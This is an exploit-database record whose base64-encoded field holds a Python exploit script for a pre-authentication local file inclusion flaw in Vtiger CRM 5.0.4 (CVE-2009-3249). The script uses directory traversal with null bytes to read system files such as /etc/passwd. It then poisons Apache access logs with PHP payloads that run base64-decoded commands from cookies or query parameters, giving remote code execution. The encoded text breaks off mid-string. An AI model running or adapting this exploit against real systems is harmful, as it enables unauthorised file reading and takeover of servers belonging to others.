{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9weXRob24NCiMgfklORk9STUFUSU9OOgkJCQkJCQkJCSMNCiMgRXhwbG9pdCBUaXRsZToJVnRpZ2VyIENSTSA1LjAuNCBQcmUtQXV0aCBMb2NhbCBGaWxlIEluY2x1c2lvbiBFeHBsb2l0ICAjDQojIEdvb2dsZSBEb3JrOgkJIlRoZSBob25lc3QgT3BlbiBTb3VyY2UgQ1JNIiAidnRpZ2VyIENSTSA1LjAuNCIJCSMNCiMgRGF0ZTogCQk1LzMvMjAxMQkJCQkJCSMNCiMgQ1ZFOgkJCUNWRS0yMDA5LTMyNDkJCQkJCQkjDQojIFdpbmRvd3MgbGluazoJCWh0dHA6Ly9iaXQubHkvZmlPWUNMCQkJCQkjDQojIExpbnV4IGxpbms6CQlodHRwOi8vYml0Lmx5L2hsdXpMZgkJCQkJIw0KIyBUZXN0ZWQgb246CQlXaW5kb3dzIFhQL0xpbnV4IFVidW50dQkJCQkJIw0KIyBQSFAuaW5pIFNldHRpbmdzOglncGNfbWFnaWNfcXVvdGVzID0gT2ZmCQkJCQkjDQojIEFkdmlzb3J5OiBodHRwOi8vd3d3LnVzaC5pdC90ZWFtL3VzaC9oYWNrLXZ0aWdlcmNybV81MDQvdnRpZ2VyY3JtXzUwNC50eHQJIw0KIyBDcmVkczogR2lvdmFubmkgImV2aWxhbGl2MyIgUGVsbGVyYW5vLCBBbnRvbmlvICJzNHRhbiIgUGFyYXRhIGFuZCBGcmFuY2VzY28JIw0KIyAiYXNjaWkiIE9uZ2FybyBhcmUgY3JlZGl0ZWQgd2l0aCB0aGUgZGlzY292ZXJ5IG9mIHRoaXMgdnVsbmVyYWJpbGl0eS4JCSMNCiMgR3JlZXR6OiBtcl9tZSwgc3VkMCwgc2lubjNyICYgbXkgb3RoZXIgZmVsbG93IGhhY2tlcnMJCQkJIw0KIyBOb3RlOiBMb2FkaW5nIFVSTCBmaWxlcyBtYXkgcmVxdWlyZSB0YW1wZXJpbmcgb2YgY29kZSA7LSkJCQkjDQoNCiMgflZVTE5FUkFCTEUgQ09ERToNCicnJw0KaWYoaXNzZXQoJF9SRVFVRVNUWydhY3Rpb24nXSkgJiYgaXNzZXQoJF9SRVFVRVNUWydtb2R1bGUnXSkpDQp7DQogICAgICAgICRhY3Rpb24gPSAkX1JFUVVFU1RbJ2FjdGlvbiddOw0KICAgICAgICAkY3VycmVudF9tb2R1bGVfZmlsZSA9ICdtb2R1bGVzLycuJF9SRVFVRVNUWydtb2R1bGUnXS4nLycuJGFjdGlvbi4nLnBocCc7DQogICAgICAgICRjdXJyZW50X21vZHVsZSA9ICRfUkVRVUVTVFsnbW9kdWxlJ107DQp9DQplbHNlaWYoaXNzZXQoJF9SRVFVRVNUWydtb2R1bGUnXSkpDQp7DQoJJGN1cnJlbnRfbW9kdWxlID0gJF9SRVFVRVNUWydtb2R1bGUnXTsNCgkkY3VycmVudF9tb2R1bGVfZmlsZSA9ICdtb2R1bGVzLycuJF9SRVFVRVNUWydtb2R1bGUnXS4nL0NoYXJ0cy5waHAnOw0KfQ0KZWxzZSB7DQogICAgZXhpdCgpOw0KLi4uDQouLi4NCi4uLg0KcmVxdWlyZV9vbmNlKCRjdXJyZW50X21vZHVsZV9maWxlKTsNCicnJw0KIyB+RVhQTE9JVDoNCmltcG9ydCBsaW5lY2FjaGUscmFuZG9tLHN5cyx1cmxsaWIsdXJsbGliMix0aW1lLHJlLGh0dHBsaWIsc29ja2V0LGJhc2U2NCxvcyx3ZWJicm93c2VyLGdldHBhc3MNCmZyb20gb3B0cGFyc2UgaW1wb3J0IE9wdGlvblBhcnNlcg0KZnJvbSB1cmxwYXJzZSBpbXBvcnQgdXJscGFyc2UsdXJsam9pbg0KZnJvbSB1cmxsaWIgaW1wb3J0IHVybG9wZW4NCg0KX19DT05UQUNUX18gPSJUZWNSMGModGVjcjBjQHRlY25pbmphLm5ldCkiDQpfX0RBVEVfXyA9IjMuMy4yMDExIg0KX19WRVJTSU9OX18gPSAiMS4wIg0KDQojIE9wdGlvbnMgZm9yIHJ1bm5pbmcgc2NyaXB0DQp1c2FnZSA9ICJcbkV4YW1wbGUgOiAlcyBodHRwOi8vbG9jYWxob3N0L3Z0aWdlcmNybS8gLXAgMTcyLjE2Ny44NzYuMzQ6ODA4MCIgJSBfX2ZpbGVfXw0KcGFyc2VyID0gT3B0aW9uUGFyc2VyKHVzYWdlPXVzYWdlKQ0KcGFyc2VyLmFkZF9vcHRpb24oIi1wIiwiLS1wIiwgdHlwZT0ic3RyaW5nIixhY3Rpb249InN0b3JlIiwgZGVzdD0icHJveHkiLA0KICAgICAgICBoZWxwPSJIVFRQIFByb3h5IDxzZXJ2ZXI+Ojxwb3J0PiIpDQpwYXJzZXIuYWRkX29wdGlvbigiLWYiLCItLWYiLCB0eXBlPSJzdHJpbmciLGFjdGlvbj0ic3RvcmUiLCBkZXN0PSJmaWxlIiwNCiAgICAgICAgaGVscD0iSW5wdXQgbGlzdCBvZiB0YXJnZXQgVVJMUyIpDQpwYXJzZXIuYWRkX29wdGlvbigiLVAiLCItLVAiLHR5cGU9ImludCIsYWN0aW9uPSdzdG9yZScsIGRlZmF1bHQ9IjgwIiwgZGVzdD0icG9ydCIsDQogICAgICAgIGhlbHA9IkNob29zZSBQb3J0IFtEZWZhdWx0OiAlZGVmYXVsdF0iKQ0KDQoob3B0aW9ucywgYXJncykgPSBwYXJzZXIucGFyc2VfYXJncygpDQoNCm51bWxpbmVzPTANCiMgUGFyYW1ldGVyIGZvciBjb21tYW5kIGV4ZWN1dGlvbg0KdnVsbldlYlBhZ2UgPSAiZ3JhcGgucGhwP21vZHVsZT0iDQojIExvY2EgRmlsZSBpbmNsdXNpb24gcGF0aA0KbGZpID0gIi4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLyINCiMgT1MgTGludXggZGV0ZWN0aW9uDQpsaW51eE9TID0gImV0Yy9wYXNzd2QiDQojIE9TIFdpbmRvd3MgRGV0ZWN0aW9uDQp3aW5kb3dzT1MgPSAid2luZG93cy93aW4uaW5pIg0KIyBXaW5kb3dzIGRlZmF1bHQgbm9uLUlJUyBzZXR1cCBhY2Nlc3MgbG9nIGZpbGUgZm9yIHZ0aWdlcg0Kd2luTG9ncyA9ICIuLi8uLi8uLi9sb2dzL2FjY2Vzcy5sb2ciDQojIFdpbmRvd3MgVnRpZ2VyIEluc3RsbGF0aW9uIFBIUCBJbmZvIGZpbGUNCnZ0UGxhdGZvcm1Mb2cgPSAiLi4vbG9ncy9wbGF0Zm9ybS5sb2ciDQojIExpbnV4IExvZyBmaWxlcw0KbG54TG9ncyA9WycvdmFyL2xvZy9hY2Nlc3NfbG9nJywNCiAgICAgICAgJy92YXIvbG9nL2FjY2Vzcy5sb2cnLA0KICAgICAgICAnL3Zhci9sb2cvYXBhY2hlMi9hY2Nlc3NfbG9nJywNCiAgICAgICAgJy92YXIvbG9nL2FwYWNoZTIvYWNjZXNzLmxvZycsDQogICAgICAgICcvdmFyL2xvZy9hcGFjaGUyL2Vycm9yX2xvZycsDQogICAgICAgICcvdmFyL2xvZy9hcGFjaGUyL2Vycm9yLmxvZycsDQogICAgICAgICcvdmFyL2xvZy9hcGFjaGUvYWNjZXNzX2xvZycsDQogICAgICAgICcvdmFyL2xvZy9hcGFjaGUvYWNjZXNzLmxvZycsDQogICAgICAgICcvdmFyL2xvZy9hcGFjaGUvZXJyb3JfbG9nJywNCiAgICAgICAgJy92YXIvbG9nL2FwYWNoZS9lcnJvci5sb2cnLA0KICAgICAgICAnL3Zhci9sb2cvdXNlci5sb2cnLA0KICAgICAgICAnL3Zhci9sb2cvdXNlci5sb2cuMScsDQogICAgICAgICcvYXBhY2hlL2xvZ3MvYWNjZXNzLmxvZycsDQogICAgICAgICcvYXBhY2hlL2xvZ3MvZXJyb3IubG9nJywNCiAgICAgICAgJy9ldGMvaHR0cGQvbG9ncy9hY2Nlc19sb2cnLA0KICAgICAgICAnL2V0Yy9odHRwZC9sb2dzL2FjY2VzLmxvZycsDQogICAgICAgICcvZXRjL2h0dHBkL2xvZ3MvYWNjZXNzX2xvZycsDQogICAgICAgICcvZXRjL2h0dHBkL2xvZ3MvYWNjZXNzLmxvZycsDQogICAgICAgICcvZXRjL2h0dHBkL2xvZ3MvZXJyb3JfbG9nJywNCiAgICAgICAgJy9ldGMvaHR0cGQvbG9ncy9lcnJvci5sb2cnLA0KICAgICAgICAnL3Vzci9sb2NhbC9hcGFjaGUyL2xvZ3MvYWNjZXNzX2xvZycsDQogICAgICAgICcvdXNyL2xvY2FsL2FwYWNoZTIvbG9ncy9hY2Nlc3MubG9nJywNCiAgICAgICAgJy91c3IvbG9jYWwvYXBhY2hlMi9sb2dzL2Vycm9yX2xvZycsDQogICAgICAgICcvdXNyL2xvY2FsL2FwYWNoZTIvbG9ncy9lcnJvci5sb2cnLA0KICAgICAgICAnL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9hY2Nlc3NfbG9nJywNCiAgICAgICAgJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzLmxvZycsDQogICAgICAgICcvdXNyL2xvY2FsL2FwYWNoZS9sb2dzL2Vycm9yX2xvZycsDQogICAgICAgICcvdXNyL2xvY2FsL2FwYWNoZS9sb2dzL2Vycm9yLmxvZycNCgknL2xvZ3MvYWNjZXNzLmxvZycsDQogICAgICAgICcvbG9ncy9lcnJvci5sb2cnLA0KCScvdmFyL2xvZy9lcnJvcl9sb2cnLA0KICAgICAgICAnL3Zhci9sb2cvZXJyb3IubG9nJywNCiAgICAgICAgJy92YXIvbG9nL2h0dHBkL2FjY2Vzc19sb2cnLA0KICAgICAgICAnL3Zhci9sb2cvaHR0cGQvYWNjZXNzLmxvZycsDQogICAgICAgICcvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2cnLA0KICAgICAgICAnL3Zhci9sb2cvaHR0cGQvZXJyb3IubG9nJywNCiAgICAgICAgJy92YXIvd3d3L2xvZ3MvYWNjZXNzX2xvZycsDQogICAgICAgICcvdmFyL3d3dy9sb2dzL2FjY2Vzcy5sb2cnLA0KICAgICAgICAnL3Zhci93d3cvbG9ncy9lcnJvcl9sb2cnLA0KICAgICAgICAnL3Zhci93d3cvbG9ncy9lcnJvci5sb2cnXQ0KIyBVc2VyIEFnZW50cw0KYWdlbnRzID0gWyJNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA1LjU7IFdpbmRvd3MgTlQgNS4wKSIsDQogICAgICAgICJJbnRlcm5ldCBFeHBsb3JlciA3IChXaW5kb3dzIFZpc3RhKTsgTW96aWxsYS80LjAgIiwNCiAgICAgICAgIkdvb2dsZSBDaHJvbWUgMC4yLjE0OS4yOSAoV2luZG93cyBYUCkiLA0KICAgICAgICAiT3BlcmEgOS4yNSAoV2luZG93cyBWaXN0YSkiLA0KICAgICAgICAiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNy4wYjsgV2luZG93cyBOVCA1LjEpIiwNCiAgICAgICAgIk9wZXJhLzguMDAgKFdpbmRvd3MgTlQgNS4xOyBVOyBlbikiXQ0KYWdlbnQgPSByYW5kb20uY2hvaWNlKGFnZW50cykNCg0KZGVmIGJhbm5lcigpOiANCiAgICBpZiBvcy5uYW1lID09ICJwb3NpeCI6IA0KICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikgDQogICAgZWxzZTogDQogICAgICAgIG9zLnN5c3RlbSgiY2xzIikgDQogICAgaGVhZGVyID0gJycnDQogX19fXyAgIF9fX19fX19fX19fX19fXy5fX18gIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fIAkNCiBcICAgXCAvICAgL1xfXyAgICBfX18vfCAgIHwvICBfX19fXy9cXyAgIF9fX19fL1xfX19fX18gICBcCQ0KICBcICAgWSAgIC8gICB8ICAgIHwgICB8ICAgLyAgIFwgIF9fXyB8ICAgIF9fKV8gIHwgICAgICAgXy8JDQogICBcICAgICAvICAgIHwgICAgfCAgIHwgICBcICAgIFxfXCAgXHwgICAgICAgIFwgfCAgICB8ICAgXAkNCiAgICBcX19fLyAgICAgfF9fX198ICAgfF9fX3xcX19fX19fICAvX19fX19fXyAgLyB8X19fX3xfICAvCQ0KICAgICAgICAgICAgICAgICAgICAgIF9fLCwsLF8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgXyBfXy4uLTsnJ2AtLS8nLyAvLicsLWAtLiANCiAgIChgLycgYCB8ICBcIFwgXCAvIC8gLyAvIC4tJy9gLF8gICBWZXJzaW9uIDUuMC40ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogIC8nYFwgXCAgIHwgIFwgfCBcfCAvLyAvLyAvIC0uLC9fLCctLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAvPDcnIDsgIFwgXCAgfCA7IHx8LyAvfCB8IFwvICAgIHxgLS8sLy0uLF8sLycpICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KLyAgXy4tLCBgLC1cLF9ffCAgXy18IC8gXCBcL3xfLyAgfCAgICAnLS8uOy4nJyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQpgLWAgIGYvIDsgICAgICAvIF9fLyBcX18gYC8gfF9fLyB8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgYC0nICAgICAgfCAgLXwgPXxcXyAgXCAgfC0nIHwgJXMgICAgICAgICAgICANCiAgICAgICAgICAgX18vICAgL18uLi0nIGAgICksJyAgLy8gRGF0ZSAlcw0KICAgICAgICAgICgoX18uLScoKF9fXy4uLScnIFxfXy4nDQoNCicnJyUoX19DT05UQUNUX18sX19EQVRFX18pDQogICAgZm9yIGkgaW4gaGVhZGVyOiANCiAgICAgICAgcHJpbnQgIlxiJXMiJWksIA0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkgDQogICAgICAgIHRpbWUuc2xlZXAoMC4wMDMpIA0KDQojIFdyaXR0ZW4gdG8gY2xlYW4gdXAgc2hlbGwgb3V0cHV0DQpkZWYgY2xlYW5VcChyZXNwb25zZSk6DQoJIiIiIENvbW1lbnQgb3IgVW5jb21tZW50IGlmIHlvdSB3YW50IHRvIGZpbHRlciB0aGUgdW53YW50ZWQgdGV4dCByZXR1cm5lZCBpbiBsb2dzICIiIg0KCXJlc3BvbnNlID0gcmUuc3ViKCc8YiguKiknLCIiLCByZXNwb25zZSkNCglyZXNwb25zZSA9IHJlLnN1YigiRmF0YWwgZXJyb3IoLiopIiwiIiwgcmVzcG9uc2UpDQoJcmVzcG9uc2UgPSByZS5zdWIoIldhcm5pbmcoLiopIiwiIiwgcmVzcG9uc2UpDQoJcmVzcG9uc2UgPSByZS5zdWIoJ05vdGljZSguKiknLCIiLCByZXNwb25zZSkNCglyZXR1cm4gcmVzcG9uc2UNCg0KZGVmIGZpcnN0TWVudSgpOg0KCXByaW50ICcnJw0KWytdIDEuIFRlc3QgRW52aXJvbm1lbnQNClsrXSAyLiBTdHJhaWdodCBUbyBNZW51JycnDQogICAgICAgIGlmIG9wdGlvbnMuZmlsZToNCgkJcHJpbnQgIlsrXSAzLiBHbyBUbyBOZXh0IFVSTCINCgltZW51Q2hvaWNlID0gcmF3X2lucHV0KCJcbj4+IEVudGVyIFlvdXIgQ2hvaWNlOiAiKQ0KICAgICAgICBpZiBtZW51Q2hvaWNlID09ICIxIjoNCgkJc3lzdGVtT1MgPSBpbmZvcm1hdGlvbkdhdGhlcmluZygpDQogICAgICAgIGlmIG1lbnVDaG9pY2UgPT0gIjIiOg0KICAgICAgICAgICAgICAgIHN5c3RlbU9TID0gcmF3X2lucHV0KCJbK10gV2hpY2ggT1M/ICh3KWluZG93cyBPciAobClpbnV4OiAiKQ0KICAgICAgICBpZiBtZW51Q2hvaWNlID09ICIzIjoNCgkJd2Vic2l0ZUxpc3Qob3B0aW9ucy5maWxlKQ0KCQlmaXJzdE1lbnUoKQ0KCWlmIHN5c3RlbU9TID09ICJsIjoNCiAgICAgICAgICAgICAgICBsaW51eE1lbnUoKQ0KICAgICAgICBpZiBzeXN0ZW1PUyA9PSAidyI6DQogICAgICAgICAgICAgICAgd2luZG93c01lbnUoKQ0KCWlmIHN5c3RlbU9TID09IE5vbmU6DQoJCWZpcnN0TWVudSgpDQoNCmRlZiB3ZWJzaXRlTGlzdCh3ZWJzaXRlRmlsZSk6DQoJZ2xvYmFsIG51bWxpbmVzDQoJbnVtbGluZXMrPTENCgl1cmwgPSBsaW5lY2FjaGUuZ2V0bGluZSh3ZWJzaXRlRmlsZSwgbnVtbGluZXMpDQoJdXJsID0gdXJsWzotMV0NCglpZiB1cmwgPT0gJyc6DQoJCXByaW50ICJbLV0gTm8gTW9yZSBFbnRyaWVzXG4iDQoJCXN5cy5leGl0KCkNCglwcmludCAiXG5bIitzdHIobnVtbGluZXMpKyJdIFRhcmdldDogIit1cmwNCgl1cmw9dXJscGFyc2UodXJsKQ0KCXJldHVybiAodXJsLCBudW1saW5lcykNCg0KZGVmIGdldFByb3h5KCk6DQoJIiIiIExldHMgeW91IHNldHVwIGEgcHJveHkgdXNpbmcgdGhlIHByb3h5IGRlZmluZWQgaW4gb3B0aW9ucy5wcm94eSAiIiINCiAgICAgICAgdHJ5Og0KCQlwcm94eV9oYW5kbGVyID0gdXJsbGliMi5Qcm94eUhhbmRsZXIoeydodHRwJzogb3B0aW9ucy5wcm94eX0pDQoJCXNvY2tldC5zZXRkZWZhdWx0dGltZW91dCgxMDApDQoJZXhjZXB0KHNvY2tldC50aW1lb3V0KToNCiAgICAgICAgICAgICAgICBwcmludCAiXG5bLV0gUHJveHkgVGltZWQgT3V0Ig0KICAgICAgICAgICAgICAgIHN5cy5leGl0KDEpDQogICAgICAgIHJldHVybiBwcm94eV9oYW5kbGVyDQoNCmRlZiBsZmlSZXF1ZXN0KGxvY2FsRmlsZSk6DQogICAgICAgICIiIiBMZXRzIHlvdSBzZW5kIGEgR0VUIHJlcXVlc3QgdG8gc2VlIGlmIExGSSBpcyBwb3NpYmxlIGVpdGhlciBieSBwcm94eSBvciBkaXJlY3QgIiIiDQoJaWYgb3B0aW9ucy5wcm94eToNCgkJdHJ5Og0KCQkJZmV0Y2hfdGltZW91dCA9IDIwDQoJCQlwcm94eWZpZXIgPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihnZXRQcm94eSgpKQ0KCQkJcHJveHlmaWVyLmFkZGhlYWRlcnMgPSBbKCdVc2VyLWFnZW50JywgYWdlbnQpXQ0KCQkJcmVzcG9uc2UgPSBwcm94eWZpZXIub3Blbih1cmwuc2NoZW1lKyI6Ly8iK3VybC5uZXRsb2MrIjoiK3N0cihvcHRpb25zLnBvcnQpK3VybC5wYXRoK3Z1bG5XZWJQYWdlK2xvY2FsRmlsZSsiJTAwIixOb25lLGZldGNoX3RpbWVvdXQpLnJlYWQoKQ0KCQlleGNlcHQgdXJsbGliMi5IVFRQRXJyb3IsIGVycm9yOg0KCQkJaWYgZXJyb3IuY29kZSA9PSAnNTAwJzoNCgkJCQlwYXNzDQoJCQlpZiBvcHRpb25zLmZpbGU6DQoJCQkJcHJpbnQgIlsrXSBUcnkgTmV4dCBVUkwiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdlYnNpdGVMaXN0KG9wdGlvbnMuZmlsZSkNCgkJCQlmaXJzdE1lbnUoKQ0KCQkJCXN5cy5leGl0KCkNCgkJCWVsc2U6DQoJCQkJcHJpbnQgIlstXSBDaGVjayBZb3VyIFdlYmFkZHJlc3MgQW5kIERpcmVjdG9yeSINCgkJCQlzeXMuZXhpdCgpDQogICAgICAgICAgICAgICAgZXhjZXB0KHVybGxpYjIuVVJMRXJyb3IpOg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlstXSBDb3VsZCBOb3QgQ29tbXVuaWNhdGUgV2l0aCBUQVJHRVRcbiINCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdbLV0gU3RvcHBpbmcgU2NyaXB0XG4nDQogICAgICAgICAgICAgICAgICAgICAgICBzeXMuZXhpdCgpDQoJZWxzZToNCgkJdHJ5Og0KCQkJcmVzcG9uc2UgPSB1cmxsaWIyLlJlcXVlc3QodXJsLnNjaGVtZSsiOi8vIit1cmwubmV0bG9jKyI6IitzdHIob3B0aW9ucy5wb3J0KSt1cmwucGF0aCt2dWxuV2ViUGFnZStsb2NhbEZpbGUrIiUwMCIpDQoJCQlyZXNwb25zZS5hZGRfaGVhZGVyKCdVc2VyLWFnZW50JyxhZ2VudCkNCgkJCXJlc3BvbnNlID0gdXJsbGliMi51cmxvcGVuKHJlc3BvbnNlKS5yZWFkKCkNCgkJCXJlc3BvbnNlID0gY2xlYW5VcChyZXNwb25zZSkNCgkJZXhjZXB0IHVybGxpYjIuSFRUUEVycm9yLCBlcnJvcjoNCgkJCWlmIGVycm9yLmNvZGUgPT0gJzUwMCc6DQoJCQkJcGFzcw0KCQkJaWYgb3B0aW9ucy5maWxlOg0KCQkJICAgICAgICBwcmludCAiWytdIFRyeSBOZXh0IFVSTCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2Vic2l0ZUxpc3Qob3B0aW9ucy5maWxlKQ0KCQkJICAgICAgICBmaXJzdE1lbnUoKQ0KCQkJICAgICAgICBzeXMuZXhpdCgpDQoJICAgICAgICAgICAgICAgIGVsc2U6DQogCQkJCXByaW50ICJbLV0gRGlkIE5vdCBXb3JrIg0KCQlleGNlcHQodXJsbGliMi5VUkxFcnJvcik6DQoJCQlwcmludCAiWy1dIENvdWxkIE5vdCBDb21tdW5pY2F0ZSBXaXRoIFRBUkdFVCINCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdbLV0gU3RvcHBpbmcgU2NyaXB0XG4nDQogICAgICAgICAgICAgICAgICAgICAgICBzeXMuZXhpdCgpDQoNCglyZXR1cm4gcmVzcG9uc2UNCg0KZGVmIGdldFJlcXVlc3QobG9jYWxGaWxlKToNCgkiIiIgTGV0cyB5b3Ugc2VuZCBhIEdFVCByZXF1ZXN0IHRvIHNlZSBpZiBMRkkgaXMgcG9zaWJsZSBlaXRoZXIgYnkgcHJveHkgb3IgZGlyZWN0ICIiIg0KCWlmIG9wdGlvbnMucHJveHk6DQoJCXRyeToNCgkJCWZldGNoX3RpbWVvdXQgPSAzMDANCgkJCXByb3h5ZmllciA9IHVybGxpYjIuYnVpbGRfb3BlbmVyKGdldFByb3h5KCkpDQoJCQlwcm94eWZpZXIuYWRkaGVhZGVycyA9IFsoJ1VzZXItYWdlbnQnLCBhZ2VudCldDQoJCQlyZXNwb25zZSA9IHByb3h5Zmllci5vcGVuKHVybC5zY2hlbWUrIjovLyIrdXJsLm5ldGxvYysiOiIrc3RyKG9wdGlvbnMucG9ydCkrdXJsLnBhdGgrdnVsbldlYlBhZ2UrbGZpK2xvY2FsRmlsZSsiJTAwIixOb25lLGZldGNoX3RpbWVvdXQpLnJlYWQoKSAgICAgICAgICAgICAgICANCgkJZXhjZXB0IHVybGxpYjIuSFRUUEVycm9yLCBlcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yTWVzc2FnZSA9IHN0cihlcnJvci5jb2RlKQ0KCQkJaWYgZXJyb3JNZXNzYWdlID09ICc1MDAnOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCBlcnJvcg0KCQkJCXJlc3BvbnNlID0gZXJyb3IucmVhZCgpDQoJCQkJcGFzcw0KCQkJZWxzZToNCgkJCQlwcmludCAiWy1dIFZlcmlmeSBBZGRyZXNzIE1hbnVhbGx5OiINCgkJCQlwcmludCAiWytdICIrdXJsLnNjaGVtZSsiOi8vIit1cmwubmV0bG9jKyI6IitzdHIob3B0aW9ucy5wb3J0KSt1cmwucGF0aCt2dWxuV2ViUGFnZStsZmkrbG9jYWxGaWxlKyIlMDAiDQoJCQkJc3lzLmV4aXQoKQ0KCWVsc2U6DQogICAgICAgICAgICAgICAgdHJ5Og0KCQkJcmVzcG9uc2UgPSB1cmxsaWIyLlJlcXVlc3QodXJsLnNjaGVtZSsiOi8vIit1cmwubmV0bG9jKyI6IitzdHIob3B0aW9ucy5wb3J0KSt1cmwucGF0aCt2dWxuV2ViUGFnZStsZmkrbG9jYWxGaWxlKyIlMDAiKQ0KCQkJcmVzcG9uc2UuYWRkX2hlYWRlcignVXNlci1hZ2VudCcsYWdlbnQpDQoJCQlyZXNwb25zZSA9IHVybGxpYjIudXJsb3BlbihyZXNwb25zZSkucmVhZCgpDQoJCWV4Y2VwdCB1cmxsaWIyLkhUVFBFcnJvciwgZXJyb3I6DQogICAgICAgICAgICAgICAgICAgICAgICBlcnJvck1lc3NhZ2UgPSBzdHIoZXJyb3IuY29kZSkNCiAgICAgICAgICAgICAgICAgICAgIAlpZiBlcnJvck1lc3NhZ2UgPT0gJzUwMCc6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50IGVycm9yDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJbLV0gVmVyaWZ5IEFkZHJlc3MgTWFudWFsbHk6Ig0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAiWytdICIrdXJsLmdldHVybCgpK3Z1bG5XZWJQYWdlK2xmaStsb2NhbEZpbGUrIiUwMCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3lzLmV4aXQoKQ0KCXJldHVybiByZXNwb25zZQ0KDQpkZWYgc29ja2V0SW5qZWN0KHBheWxvYWRUeXBlKToNCgkiIiIgTGV0cyB5b3UgaW5qZWN0IGludG8gdGhlIEFwYWNoZSBhY2Nlc3MgbG9nIGJ5IHByb3h5IG9yIGRpcmVjdCAiIiINCiAgICAgICAgaWYgb3B0aW9ucy5wcm94eToNCgkJdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgcHJveHlJcCwgcHJveHlQb3J0ID0gb3B0aW9ucy5wcm94eS5zcGxpdCgnOicpDQogICAgICAgICAgICAgICAgICAgICAgICBwcm94eVBvcnQgPSBpbnQocHJveHlQb3J0KQ0KCQkJc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHNvY2suY29ubmVjdCgocHJveHlJcCwgcHJveHlQb3J0KSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBheWxvYWRUeXBlID09ICdzeXN0ZW1QYXlsb2FkJzoNCgkJCQlzb2NrLnNlbmQoIkdFVCAiK3VybC5zY2hlbWUrIjovLyIrdXJsLm5ldGxvYysiOiIrc3RyKG9wdGlvbnMucG9ydCkrIi8iKyI8P3BocDtzeXN0ZW0oYmFzZTY0X2RlY29kZSgkX0NPT0tJRVt2YWx1ZV0pKTs/PiBIVFRQLzEuMVxyXG4iKQ0KCQkJCXNvY2suc2VuZCgiVXNlci1BZ2VudDogIithZ2VudCsiXHJcbiIpDQoJCQkJc29jay5zZW5kKCJIb3N0OiAiK3VybC5nZXR1cmwoKSsiXHJcbiIpDQoJCQkJc29jay5zZW5kKCJDb25uZWN0aW9uOiBjbG9zZVxyXG5cclxuIikNCgkJCWlmIHBheWxvYWRUeXBlID09ICdpbmNsdWRlUGF5bG9hZCc6DQoJCQkJc29jay5zZW5kKCJHRVQgIit1cmwuc2NoZW1lKyI6Ly8iK3VybC5uZXRsb2MrIjoiK3N0cihvcHRpb25zLnBvcnQpKyIvIisiPD9waHA7aW5jbHVkZShiYXNlNjRfZGVjb2RlKCRfR0VUW2NtZF0pKTs/PiBIVFRQLzEuMFxyXG5cclxuIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc29jay5zZW5kKCJVc2VyLUFnZW50OiAiK2FnZW50KyJcclxuIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc29jay5zZW5kKCJIb3N0OiAiK3VybC5nZXR1cmwoKSsiXHJcbiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNvY2suc2VuZCgiQ29ubmVjdGlvbjogY2xvc2VcclxuXHJcbiIpCQkJDQoJCQlzb2NrLmNsb3NlKCkNCgkJCXByaW50ICJbK10gSW5qZWN0ZWQgUGF5bG9hZCBJbnRvIExvZ3MiDQoJCWV4Y2VwdDoNCiAgICAgICAgCSAgICAgICAgcHJpbnQgIlstXSBDb3VsZCBOb3QgSW5qZWN0IEludG8gTG9ncyINCgkJCXN5cy5leGl0KDEpDQoJZWxzZToNCgkJdHJ5Og0KCQkJc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCgkJCXNvY2suY29ubmVjdCgodXJsLm5ldGxvYywgb3B0aW9ucy5wb3J0KSkNCgkJCWlmIHBheWxvYWRUeXBlID09ICdzeXN0ZW1QYXlsb2FkJzoNCgkJCQlzb2NrLnNlbmQoIkdFVCAiK3VybC5zY2hlbWUrIjovLyIrdXJsLm5ldGxvYysiOiIrc3RyKG9wdGlvbnMucG9ydCkrIi8iKyI8P3BocDtzeXN0ZW0oYmFzZTY0X2RlY29kZSgkX0NPT0tJRVt2YWx1ZV0pKTs/PiBIVFRQLzEuMVxyXG4iKQ0KCQkJCXNvY2suc2VuZCgiVXNlci1BZ2VudDogIithZ2VudCsiXHJcbiIpDQoJCQkJc29jay5zZW5kKCJIb3N0OiAiK3VybC5zY2hlb